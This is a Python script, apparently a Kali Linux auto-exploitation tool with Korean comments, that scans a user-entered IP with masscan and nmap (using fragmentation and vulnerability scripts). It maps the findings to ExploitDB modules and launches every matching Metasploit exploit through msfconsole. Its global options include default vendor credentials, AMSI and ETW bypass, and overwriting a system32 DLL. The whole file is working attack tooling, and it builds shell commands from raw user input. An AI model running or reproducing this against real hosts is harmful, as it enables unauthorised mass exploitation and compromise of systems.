#git clone https://github.com/allfro/pymetasploit

import os, sys, re, optparse, urllib3, time
from pyperclip import copy as copy
#pymetasploit3
#from pymetasploit3.msfconsole import MsfRpcConsole
#from pymetasploit3.msfrpc import MsfRpcClient

#필요사항
#1. 각 모듈 돌릴때 옵션 지정
#2. Mitre Mapping
#3. NMAP Scanning Speed 개선

try:
    urllib3.disable_warnings()

    if os.path.isdir("/usr/share/nmap/scripts/nmap-vulners"):
        if os.path.isdir("/usr/share/nmap/scripts/vulscan"):
            # nmap, searchsploit UPDATE
            os.system('clear')
            # print("[*] Attack Module Update")
            # time.sleep(1)
            # os.system('apt-get dist-upgrade -y; apt update -y; apt install metasploit-framework -y; apt list --upgradable -y')
            # os.system('clear')
            # print("[*] Nmap, Searchsploit Update")
            # time.sleep(1)
            # os.system("nmap --script-updatedb && searchsploit -u && chmod -x /usr/share/nmap/scripts/vulscan/utilities/updater/updateFiles.sh && ./usr/share/nmap/scripts/vulscan/utilities/updater/updateFiles.sh")

            #1. User IP Input
            os.system('clear')
            USE_IP = input("IP Value: "); os.system('clear')
            # USE_IP = "192.168.88.149"; os.system('clear')
            os.system("masscan -sS " + USE_IP + " --banners -p0-65535 --rate 1000 --source-ip 2603:3001:2d00:da00:91d7:b54:b498:859d -oX " + USE_IP.replace("/","_") + "_result.txt")

            PORT_SCAN_LIST = list()
            with open("/home/kali/Desktop/" + USE_IP.replace("/","_") + "_result.txt", "r+") as fo:
                for PORT_SCAN_STRING in fo.readlines():
                    if re.findall("portid\=\"(.*?)\"", PORT_SCAN_STRING):
                        PORT_SCAN_LIST.append("".join(re.findall("portid\=\"(.*?)\"", PORT_SCAN_STRING)))

            PORT_SCAN_LIST = ",".join(PORT_SCAN_LIST)

            os.system("rm -rf " + "/home/kali/Desktop/" + USE_IP.replace("/","_") + "_result.txt")

            # 2. Massscan & Nmap Scanning Result Xml -> Searchsploit Nmap File Search
            os.system('clear && ' + "nmap -sSV -Pn -PN -f --mtu 48 --stats-every 30s --max-retries 2 --system-dns --defeat-rst-ratelimit --traceroute -p " + PORT_SCAN_LIST + " -A --script=nmap-vulners/vulners,vulscan/vulscan --script-args vulscandb=exploitdb.csv " + USE_IP + " -T5 -oX /home/kali/Desktop/" + USE_IP.replace("/","_") + "_result.xml")

            # 3. Searchsploit Nmap File Parsing Create File
            os.system("searchsploit --nmap /home/kali/Desktop/" + USE_IP.replace("/","_") +"_result.xml > /home/kali/Desktop/" + USE_IP.replace("/","_") + "_result2")
            Tmp_FileNumber = list()
            OS_File = ""
            TMP_OS_File = list()
            Information_Target = ""

            # Python .rb File Search Split
            with open("/home/kali/Desktop/" + USE_IP.replace("/","_") + "_result2", "r+") as fo:
                for rb_File_Search in fo.readlines():
                    if "".join([rb_File_Search for rb_File_Search in re.findall(r".*(?<=\|)(.*\.rb)", rb_File_Search.strip())]) not in "":
                        Tmp_FileNumber.append("".join([rb_File_Search for rb_File_Search in re.findall(r".*\|(?<=\|).*/(.*\.rb)",rb_File_Search.strip())]))


            with open("/home/kali/Desktop/" + USE_IP.replace("/","_") + "_result.xml", "r+") as fo:
                Full_Text = fo.read()
                Line_Text = Full_Text.split("\n")
                for Detect_File_Search in Line_Text:
                    Detect_File_Search = Detect_File_Search.strip()
                    if "".join([OS_DETECTOR for OS_DETECTOR in re.findall(r".*ostype=\"(.*?)\"", Detect_File_Search)]) not in "":
                        OS_File += "[+] Detect OS: " + "".join([OS_DETECTOR for OS_DETECTOR in re.findall(r".*ostype=\"(.*?)\"", Detect_File_Search)]) + "\n"
                        TMP_OS_File.append("".join([OS_DETECTOR for OS_DETECTOR in re.findall(r".*ostype=\"(.*?)\"", Detect_File_Search)]))

                    if "".join([VENDER_DETECT for VENDER_DETECT in re.findall(r"\<address addr\=\".*\".*addrtype\=\"mac\".*vendor\=\"(.*?)\".*>", Detect_File_Search)]) not in "":
                        OS_File += "[+] Vendor: " + "".join([VENDER_DETECT for VENDER_DETECT in re.findall(r"\<address addr\=\".*\".*addrtype\=\"mac\".*vendor\=\"(.*?)\".*>", Detect_File_Search)]).replace("\s", "") + "\n"

                    if "".join([Tracking_OS_DETECTOR for Tracking_OS_DETECTOR in re.findall(r".*osmatch name=\"(.*?)\"", Detect_File_Search)]) not in "":
                        OS_File += "[+] Tracking OS: " + "".join([Tracking_OS_DETECTOR for Tracking_OS_DETECTOR in re.findall(r".*osmatch name=\"(.*?)\"", Detect_File_Search)]).replace("\s", "") + "\n"

                    if "".join([IPv4_DETECT for IPv4_DETECT in re.findall(r"\<address addr\=\"(.*?)\".*addrtype\=\"ipv4.*\>", Detect_File_Search)]) not in "":
                        Information_Target += "\nIP: " + "".join([IPv4_DETECT for IPv4_DETECT in re.findall(r"\<address addr\=\"(.*?)\".*addrtype\=\"ipv4.*\>", Detect_File_Search)]) + "\n"

                    if "".join([MAC_DETECT for MAC_DETECT in re.findall(r"\<address addr\=\"(.*?)\".*addrtype\=\"mac\".*vendor\=\".*\".*>", Detect_File_Search)]) not in "":
                        Information_Target += "MAC: " + "".join([MAC_DETECT for MAC_DETECT in re.findall(r"\<address addr\=\"(.*?)\".*addrtype\=\"mac\".*vendor\=\".*\".*>", Detect_File_Search)]) + "\n"

                    if "".join([IPADDR_DETECT for IPADDR_DETECT in re.findall(r"\<hop ttl\=\".*\" ipaddr\=\"(.*?)\".*\>", Detect_File_Search)]) not in "":
                        Information_Target += "Trace IP: " + "".join([IPADDR_DETECT for IPADDR_DETECT in re.findall(r"\<hop ttl\=\".*\" ipaddr\=\"(.*?)\".*\>", Detect_File_Search)]) + "\n\n"

                    if "".join([HOSTNAME_DETECT for HOSTNAME_DETECT in re.findall(r"hostname=\"(.*?)\"", Detect_File_Search)]) not in "":
                        Information_Target += "HostName: " + "".join([HOSTNAME_DETECT for HOSTNAME_DETECT in re.findall(r"hostname=\"(.*?)\"", Detect_File_Search)]).replace("\s", "") + "\n\n"

                with open(r"/home/kali/Desktop/" + USE_IP.replace("/","_") + "_Vulnerability.txt", "w") as CVSS_Save:
                    for CVSS_Attack in re.findall(r"\<table\>\n\<elem key\=\"(.*?)\"\>(.*?)\<\/elem\>\n\<elem key\=\"(.*?)\"\>(.*?)\<\/elem\>\n\<elem key\=\"(.*?)\"\>(.*?)\<\/elem\>\n\<elem key\=\"(.*?)\"\>(.*?)\<\/elem\>\n\<\/table\>", Full_Text):
                        if "true" in CVSS_Attack[CVSS_Attack.index("is_exploit") + 1]:
                        # CVSS Score
                        # 높음 : CVSS 기본 점수가 7.0–10.0인 취약점
                        # 중간 : CVSS 기본 점수가 4.0–6.9인 취약점
                        # 낮음 : CVSS 기본 점수가 0.0–3.9인 취약점
                            if ((float(CVSS_Attack[CVSS_Attack.index("cvss") + 1]) >= 4) and (float(CVSS_Attack[CVSS_Attack.index("cvss") + 1]) < 7)):
                                CVSS_Save.writelines("\n[Normal] : " + CVSS_Attack[CVSS_Attack.index("cvss") + 1] + "\n")
                                CVSS_Save.writelines(re.findall(r"(https?\:\/\/vulners\.com\/.*?" + CVSS_Attack[CVSS_Attack.index("id") + 1] + ")", Full_Text)[-1] + "\n")
                            elif ((float(CVSS_Attack[CVSS_Attack.index("cvss") + 1]) >= 7) and (float(CVSS_Attack[CVSS_Attack.index("cvss") + 1]) <= 10)):
                                CVSS_Save.writelines("\n[◆ Critical CVSS ◆] : " + CVSS_Attack[CVSS_Attack.index("cvss") + 1] + "\n")
                                CVSS_Save.writelines(re.findall(r"(https?\:\/\/vulners\.com\/.*?" + CVSS_Attack[CVSS_Attack.index("id") + 1] + ")", Full_Text)[-1] + "\n")
                            else:
                                pass

            USE_FILE = list()
            USE_PATH = list()

            #4. Searchsploit Nmap File Parsing Create File ---> Parsing
            for Num_FileNumber in Tmp_FileNumber:
                USE_FILE.append(os.popen("searchsploit -p " + Num_FileNumber + " | grep -i path: | awk '{print $2}'").read())
                USE_PATH.append(os.popen("searchsploit -p " + Num_FileNumber + " | gawk 'match($0, /\/usr.*\/exploits\/(.*\/).*\.rb/, autojm) { print autojm[1] }'").read())

            # print(Tmp_FileNumber)  #.rb File(12032.rb, 11021.rb)
            # print(USE_PATH)    #unix/remote, hardware/remote
            # print(USE_FILE)    #/usr/share/exploitdb/exploits/unix/remote, /usr/share/exploitdb/exploits/php/

            USE_Attack_List = list()

            for Cycle_Ready in range(len(USE_PATH)):
                os.popen(("cat /usr/share/exploitdb/exploits/" + USE_PATH[Cycle_Ready] + Tmp_FileNumber[Cycle_Ready] + " | gawk 'match($0, /.*Id:(.*).rb/, autojm) { print autojm[1] }'").replace("\r", "").replace("\n","").strip()).read()
                USE_Attack_List.append(os.popen(("cat /usr/share/exploitdb/exploits/" + USE_PATH[Cycle_Ready] + Tmp_FileNumber[Cycle_Ready] + " | gawk 'match($0, /.*Id:(.*).rb/, autojm) { print autojm[1] }'").replace("\r", "").replace("\n","").strip()).read())

            os.system("clear")
            os.system("service postgresql restart")
            os.system("service apache2 restart")

            cnt = 0
            exploits = ""
            result_list = list()

            for Cycle_Attack_List in list(set(list(filter(None, USE_Attack_List)))):
                msf_file = str(Cycle_Attack_List.strip())
                result_list.append(os.popen("locate " + msf_file + ".rb | gawk 'match($0, /.*exploits\/(.*)\.rb/, autojm) { print autojm[1] }'").read()) #list_get_value_
            result_list = list(set(list(filter(None,(result_list)))))
            set(result_list)
            result_list = list(filter(None, result_list))

            source_metasploit = r""" setg HttpPassword cisco; setg HttpUsername cisco; setg SRVHOST 0.0.0.0; setg SRVPORT 8080; setg URIPATH /; setg VHOST 0.0.0.0; setg TARGETURI /; setg LURI /; setg UPLOAD_FILE_NAME iQMMhIYPOLAGObK; setg RPORT_TFTP 69; setg HTTPDELAY 15; setg USE_SSL true; setg LEAK_FILE /opt/infra/idaccessmgr/logfile.txt; setg SERVER_ADDR *.*.*.*; setg USERNAME admin; setg USER_ID 1; setg PASSWORD nagiosadmin; setg FINISH_INSTALL true; setg TIMEOUT 3; setg MINIONS .*; setg CUSTOM true; setg SMBPIPE LSARPC; setg APP_NAME app; setg MeterpreterDebugLevel 3; setg SESSION 1; setg CMD calc.exe; setg FILENAME msf.pdf; setg PDF::Encoder ASCIIHEX; setg PDF::Method DOCUMENT; setg PDF::MultiFilter 1; setg PDF::Obfuscate TRUE; setg EXITFUNC process; setg PATH /; setg EMAIL TestUserDA@adlab.local; setg METHOD DLL; setg UseAlternatePath FALSE; setg DOMAIN WORKGROUP; setg TARGETPATH C:\\ ; setg PAYLOAD_NAME %RAND%.exe; setg EXECUTE_DELAY 3; setg EXPLOIT_NAME %RAND%; setg EXPLOIT_TIMEOUT 60; setg DLLNAME msf.dll; setg PROCESS notepad.exe; setg EXPLOIT_DIR %TEMP%\\%RAND%; setg OVERWRITE_DLL %WINDIR%\\system32\\ualapi.dll; setg PAYLOAD_UPLOAD_NAME %RAND%; setg PHONEBOOK_UPLOAD_NAME %RAND%; setg JOB_WAIT_TIME 60; setg RESTART_TARGET TRUE; setg WRITABLE_DIR %TEMP%; setg DESTINATION_FILE ualapi.dll; setg DESTINATION_PATH %WINDIR%\\system32\\; setg JUNCTION_PATH %TEMP%/%RAND%; setg PRINTER_NAME ZVRhh; setg AMSIBYPASS TRUE; setg ETWBYPASS TRUE; setg WAIT 5; setg AVTIMEOUT 60; setg DLLPATH %TEMP%; setg MAKEDLL FALSE; setg PROGRAMDATA C:\\ProgramData\\DockerDesktop\\version-bin\\; setg USE_INJECTION TRUE; setg DLL CRYPTBASE.dll; setg ListenerTimeout 3610; setg AUTOUNHOOK FALSE; setg WAIT_UNHOOK 5; setg IMAGE_FILE notepad.exe; setg START_APP TRUE; setg SVC_DNAME MsfDynSvc; setg SVC_GEN FALSE; setg SVC_NAME MsfDynSvc; setg AGGRESSIVE FALSE; setg STEALTH_ONLY FALSE; setg WAIT_FOR_TIWORKER 0; setg WRITABLE_PATH_DIR %TEMP%; setg SERVICE_FILENAME IfoTziL; setg SERVICE_NAME NTSHIUUVp; setg HOSTINFO_NAME AgentController; setg DIRECTORY C:\\;"""

            source_metasploit += source_metasploit + " setg RHOST " + USE_IP + "; " + "setg RHOSTS " + USE_IP + "; " + "setg LHOST eth0;"
            Payload_Attack = ""


            TMP_OS_File = list(set(list(filter(None,(TMP_OS_File)))))

            Select_OS = list()

            for List_Temp_Module in TMP_OS_File: #취약한 모듈 전체 출력
                for exploit_ready in result_list:
                    select = "".join(re.findall("(.*?)\/.*", exploit_ready))
                    if List_Temp_Module.upper() == select.upper():
                        os.system("msfconsole -q -x \"" + "use " + exploit_ready.strip() + ";" + source_metasploit + " run; exit;\"")
                        Select_OS.append("".join(exploit_ready))

            os.system("clear")

            os.system("rm -rf /home/kali/Desktop/" + USE_IP.replace("/","_") + "_result2")

            print("\n\n======================================================\n\t[+] Metasploit Exploit Module List \n======================================================\n")
            for Result_Select_OS in Select_OS:
                print(Result_Select_OS.strip())

            print("\n\n======================================================\n\t[+] Metasploit Attack Module List \n======================================================\n")
            print("\n추가적인 도출 된 취약점에 대해서는 /home/kali/Desktop/" + USE_IP.replace("/","_") + "_Vulnerability.txt 에서 확인하실 수 있습니다!")

            # OS Detect Infomation
            print("\n\n======================================================\n\t[+] OS Dectect List \n======================================================\n" + str(OS_File))

            # Target Information
            print("\n\n======================================================\n\t[+] Target Information \n======================================================\n" + str(Information_Target))

    else:
        print("vulscan, vulners가 설치되지 않아 5초 후 설치 진행하겠습니다.\n원치 않으면 종료 부탁드립니다!")
        cnt = 1
        time.sleep(5)
        os.system('cls')
        os.system("cd /usr/share/nmap/scripts && git clone https://github.com/vulnersCom/nmap-vulners.git && git clone https://github.com/scipag/vulscan.git")
        os.system('cls')
        print("작업이 완료되었습니다!")

except Exception as e:
    print("[ Error ] : " + str(e))
